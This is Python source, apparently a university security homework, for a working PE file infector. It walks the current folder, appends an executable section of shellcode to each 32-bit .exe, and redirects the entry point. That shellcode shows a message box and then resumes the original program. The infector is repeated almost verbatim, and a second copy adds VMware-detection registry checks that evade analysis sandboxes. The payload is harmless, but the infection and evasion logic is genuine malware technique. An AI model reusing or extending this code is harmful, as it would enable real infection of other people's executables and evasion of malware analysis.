import pefile
from os import listdir, getcwd
from os.path import isfile, join
from struct import pack


def align(size, align):
	if size % align: 
		size = ((size + align) // align) * align
	return size

def findMsgBox(pe):
	for entry in pe.DIRECTORY_ENTRY_IMPORT:
		dll_name = entry.dll.decode('utf-8')
		if dll_name == "USER32.dll":
			for func in entry.imports:
				if func.name.decode('utf-8') == "MessageBoxW":
					print("Found \t%s at 0x%08x" % (func.name.decode('utf-8'), func.address))
					return func.address

def generatePayload(msgBoxOff, oep, captionRVA, textRVA, Size):
	'''
	caption: Infetion by NT230: 
	\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20
	\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00\x00\x00
	text: 20520162_20520323_20520514: 
	\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x31\x00\x36\x00\x32\x00\x5F\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x33\x00\x32\x00\x33\x00\x5F\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x35\x00\x31\x00\x34
	'''

	capLittle = captionRVA.to_bytes(4, 'little')
	textLittle = textRVA.to_bytes(4, 'little')
	msgBoxLittle = msgBoxOff.to_bytes(4, 'little')
	oepLittle = oep.to_bytes(4, byteorder='little', signed=True)

	payload = b'\x6a\x00\x68'+ capLittle+ b'\x68' + textLittle + b'\x6a\x00\xff\x15'+ msgBoxLittle +b'\xe9'+ oepLittle +b'\x00\x00\x00\x00\x00\x00\x00'
	payload += b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00'
	payload += b'\x32\x00\x33\x00\x30\x00\x00\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x31\x00\x36\x00\x32\x00\x5F\x00\x32\x00\x30'
	payload += b'\x00\x35\x00\x32\x00\x30\x00\x33\x00\x32\x00\x33\x00\x5F\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x35\x00\x31\x00\x34'
	# print(payload)
	return payload

def createNewSection(pe):
	# lấy section cuối
	lastSection = pe.sections[-1]
	# tạo 1 đối tượng section mới theo cấu trúc Section của file pe muốn lây nhiễm
	newSection = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
	# cho dữ liệu của section mới tạo này mặc định bằng null hết
	newSection.__unpack__(bytearray(newSection.sizeof()))

	# đặt section header nằm ngay sau section header cuối cùng(giả sử có đủ khoảng trống)
	newSection.set_file_offset(lastSection.get_file_offset() + lastSection.sizeof())
	# gán tên Section mới là .test
	newSection.Name = b'.test'
	# cho section mới có kích thước 100 byte
	newSectionSize = 100
	newSection.SizeOfRawData = align(newSectionSize, pe.OPTIONAL_HEADER.FileAlignment)
	# gán raw address cho section mới
	newSection.PointerToRawData = len(pe.__data__)
	print("New section raw address is 0x%08x" % (newSection.PointerToRawData))
	# gán kích thước cho Virtual Address của section mới
	newSection.Misc = newSection.Misc_PhysicalAddress = newSection.Misc_VirtualSize = newSectionSize
	# gán địa chỉ ảo cho section mới
	newSection.VirtualAddress = lastSection.VirtualAddress + align(lastSection.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
	print("New section virtual address is 0x%08x" % (newSection.VirtualAddress))
	newSection.Characteristics = 0xE0000040 # giá trị cờ cho phép read | execute | code

	return newSection

def appendPayload(filePath):
	pe = pefile.PE(filePath)
	print("\n------------Infecting " + filePath + "------------\n")
	# tạo section mới
	newSection = createNewSection(pe)
	# lấy địa chỉ của hàm MessageBoxW được import vào
	msgBoxOff = findMsgBox(pe)

	# tính VA của caption và text theo công thức RA – Section RA = VA – Section VA
	captionRVA = 0x20 + newSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
	textRVA = 0x46 + newSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase

	# tính relative virtual address của OEP để sử dụng nó với lệnh jump quay lại ban đầu
	oldEntryPointVA = pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase
	newEntryPointVA =  newSection.VirtualAddress+ pe.OPTIONAL_HEADER.ImageBase
	jmp_instruction_VA = newEntryPointVA + 0x14

	RVA_oep = oldEntryPointVA - 5 - jmp_instruction_VA

	# tạo payload ứng với các địa chỉ vừa mới tính
	payload = generatePayload(msgBoxOff, RVA_oep, captionRVA, textRVA, newSection.SizeOfRawData)

	# tạo 1 đối tượng bytearray để lưu payload
	dataOfNewSection = bytearray(newSection.SizeOfRawData)
	for i in range(len(payload)):
		dataOfNewSection[i]=payload[i]

	# điều chỉnh Entry Point
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = newSection.VirtualAddress

	# Tăng kích thước Size of Image thêm 100
	pe.OPTIONAL_HEADER.SizeOfImage += align(100, pe.OPTIONAL_HEADER.SectionAlignment)

	# tăng số lượng section
	pe.FILE_HEADER.NumberOfSections += 1

	# thêm section mới vào sau file
	pe.sections.append(newSection)
	pe.__structures__.append(newSection)

	# thêm dữ liệu của section mới vào vùng section mới thêm vào
	pe.__data__ = bytearray(pe.__data__) + dataOfNewSection
	# ghi dữ liệu và đóng file
	pe.write(filePath)
	pe.close()
	print(filePath + " was infected.")


if __name__ == '__main__':
	# lấy đường dẫn thư mục hiện tại
	current_dir = getcwd()
	# lấy tên từng file exe trong thư mục hiện tại
	files_name = [f for f in listdir(current_dir) if (isfile(join(current_dir, f))&f.endswith(".exe"))]
	for file in files_name:
		# xác định tên của section cuối có phải là .test hay không
		pe = pefile.PE(file)
		lastSection = pe.sections[-1]
		lastSectionName = lastSection.Name.decode('UTF-8').rstrip('\x00')
		pe.close()

		if pe.FILE_HEADER.Machine == 0x8664:
			print(file + " is 64-bit => cannot infect")
		elif lastSectionName == ".test":
			print(file + " have " + lastSectionName + " section => no need to infect")
		else:
			print(file + " need to infect")
			appendPayload(file)

import pefile
import winreg
import ctypes
from os import listdir, getcwd
from os.path import isfile, join
from struct import pack


def align(size, align):
	if size % align: 
		size = ((size + align) // align) * align
	return size

def findMsgBox(pe):
	for entry in pe.DIRECTORY_ENTRY_IMPORT:
		dll_name = entry.dll.decode('utf-8')
		if dll_name == "USER32.dll":
			for func in entry.imports:
				if func.name.decode('utf-8') == "MessageBoxW":
					print("Found \t%s at 0x%08x" % (func.name.decode('utf-8'), func.address))
					return func.address

def generatePayload(msgBoxOff, oep, captionRVA, textRVA, Size):
	'''
	caption: Infetion by NT230: 
	\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20
	\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00\x00\x00
	text: 20520162_20520323_20520514: 
	\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x31\x00\x36\x00\x32\x00\x5F\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x33\x00\x32\x00\x33\x00\x5F\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x35\x00\x31\x00\x34
	'''

	capLittle = captionRVA.to_bytes(4, 'little')
	textLittle = textRVA.to_bytes(4, 'little')
	msgBoxLittle = msgBoxOff.to_bytes(4, 'little')
	oepLittle = oep.to_bytes(4, byteorder='little', signed=True)

	payload = b'\x6a\x00\x68'+ capLittle+ b'\x68' + textLittle + b'\x6a\x00\xff\x15'+ msgBoxLittle +b'\xe9'+ oepLittle +b'\x00\x00\x00\x00\x00\x00\x00'
	payload += b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00'
	payload += b'\x32\x00\x33\x00\x30\x00\x00\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x31\x00\x36\x00\x32\x00\x5F\x00\x32\x00\x30'
	payload += b'\x00\x35\x00\x32\x00\x30\x00\x33\x00\x32\x00\x33\x00\x5F\x00\x32\x00\x30\x00\x35\x00\x32\x00\x30\x00\x35\x00\x31\x00\x34'
	# print(payload)
	return payload

def createNewSection(pe):
	# lấy section cuối
	lastSection = pe.sections[-1]
	# tạo 1 đối tượng section mới theo cấu trúc Section của file pe muốn lây nhiễm
	newSection = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
	# cho dữ liệu của section mới tạo này mặc định bằng null hết
	newSection.__unpack__(bytearray(newSection.sizeof()))

	# đặt section header nằm ngay sau section header cuối cùng(giả sử có đủ khoảng trống)
	newSection.set_file_offset(lastSection.get_file_offset() + lastSection.sizeof())
	# gán tên Section mới là .test
	newSection.Name = b'.test'
	# cho section mới có kích thước 100 byte
	newSectionSize = 100
	newSection.SizeOfRawData = align(newSectionSize, pe.OPTIONAL_HEADER.FileAlignment)
	# gán raw address cho section mới
	newSection.PointerToRawData = len(pe.__data__)
	print("New section raw address is 0x%08x" % (newSection.PointerToRawData))
	# gán kích thước cho Virtual Address của section mới
	newSection.Misc = newSection.Misc_PhysicalAddress = newSection.Misc_VirtualSize = newSectionSize
	# gán địa chỉ ảo cho section mới
	newSection.VirtualAddress = lastSection.VirtualAddress + align(lastSection.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
	print("New section virtual address is 0x%08x" % (newSection.VirtualAddress))
	newSection.Characteristics = 0xE0000040 # giá trị cờ cho phép read | execute | code

	return newSection

def appendPayload(filePath):
	pe = pefile.PE(filePath)
	print("\n------------Infecting " + filePath + "------------\n")
	# tạo section mới
	newSection = createNewSection(pe)
	# lấy địa chỉ của hàm MessageBoxW được import vào
	msgBoxOff = findMsgBox(pe)

	# tính VA của caption và text theo công thức RA – Section RA = VA – Section VA
	captionRVA = 0x20 + newSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
	textRVA = 0x46 + newSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase

	# tính relative virtual address của OEP để sử dụng nó với lệnh jump quay lại ban đầu
	oldEntryPointVA = pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase
	newEntryPointVA =  newSection.VirtualAddress+ pe.OPTIONAL_HEADER.ImageBase
	jmp_instruction_VA = newEntryPointVA + 0x14

	RVA_oep = oldEntryPointVA - 5 - jmp_instruction_VA

	# tạo payload ứng với các địa chỉ vừa mới tính
	payload = generatePayload(msgBoxOff, RVA_oep, captionRVA, textRVA, newSection.SizeOfRawData)

	# tạo 1 đối tượng bytearray để lưu payload
	dataOfNewSection = bytearray(newSection.SizeOfRawData)
	for i in range(len(payload)):
		dataOfNewSection[i]=payload[i]

	# điều chỉnh Entry Point
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = newSection.VirtualAddress

	# Tăng kích thước Size of Image thêm 100
	pe.OPTIONAL_HEADER.SizeOfImage += align(100, pe.OPTIONAL_HEADER.SectionAlignment)

	# tăng số lượng section
	pe.FILE_HEADER.NumberOfSections += 1

	# thêm section mới vào sau file
	pe.sections.append(newSection)
	pe.__structures__.append(newSection)

	# thêm dữ liệu của section mới vào vùng section mới thêm vào
	pe.__data__ = bytearray(pe.__data__) + dataOfNewSection
	# ghi dữ liệu và đóng file
	pe.write(filePath)
	pe.close()
	print(filePath + " was infected.")


if __name__ == '__main__':
	# lấy đường dẫn thư mục hiện tại
	current_dir = getcwd()
	# lấy tên từng file exe trong thư mục hiện tại
	files_name = [f for f in listdir(current_dir) if (isfile(join(current_dir, f))&f.endswith(".exe"))]
	for file in files_name:
		# xác định tên của section cuối có phải là .test hay không
		pe = pefile.PE(file)
		lastSection = pe.sections[-1]
		lastSectionName = lastSection.Name.decode('UTF-8').rstrip('\x00')
		pe.close()

		if pe.FILE_HEADER.Machine == 0x8664:
			print(file + " is 64-bit => cannot infect")
		elif lastSectionName == ".test":
			print(file + " have " + lastSectionName + " section => no need to infect")
		else:
			print(file + " need to infect")
			appendPayload(file)

# Define the message box parameters
message = "Bad environment --- VMWare Detected!!!!"
title = "Homework 2 - Group 13"
style = 0x40 | 0x1  # MB_ICONINFORMATION | MB_OK


# Define the registry key path and value name
key_sys = r"SYSTEM\ControlSet001\Control\SystemInformation"
sys_man = "SystemManufacturer"
sys_prod = "SystemProductName"

key_hardware_1 = r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0"
key_hardware_2 = r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0"
id = "Identifier"

key_software = r"SOFTWARE\VMware, Inc.\VMware Tools"

detect = 0

# Check System Info Registry key
try:
    syskey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_sys)
    Mf_value = winreg.QueryValueEx(syskey, sys_man)
    for value in Mf_value:
        if (value.__contains__("VMware")):
            detect = detect + 1
            break
    Sys_value = winreg.QueryValueEx(syskey,sys_prod)
    for value in Sys_value:
        if (value.__contains__("VMware")):
            detect = detect + 1
            break
    winreg.CloseKey(syskey)
except:
    print("Cant open SystemInformation")
    

# Check Hardware Info registry key
try:
    hardkey1 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_hardware_1)
    localid2_value = winreg.QueryValueEx(hardkey1, id)
    for value in localid2_value:
        if (value.__contains__("VMware")):
            detect = detect + 1
            break
    winreg.CloseKey(hardkey1)
except:
    print("Cant open Scsi Port 2")
    

try:
    hardkey2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_hardware_2)
    localid3_value = winreg.QueryValueEx(hardkey2, id)
    for value in localid3_value:
        if (value.__contains__("VMware")):
            detect = detect + 1
            break
    winreg.CloseKey(hardkey2)
except:
    print("Cant open Scsi Port 3")
    

# Check VMware tool
try:
    if(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_software)):
        detect = detect + 1
except:
    print("Cant find VMware Tool registry key")
    

# Check if the value exists in the key
if (detect > 0):
    ctypes.windll.user32.MessageBoxW(None, message, title, style)
    exit()

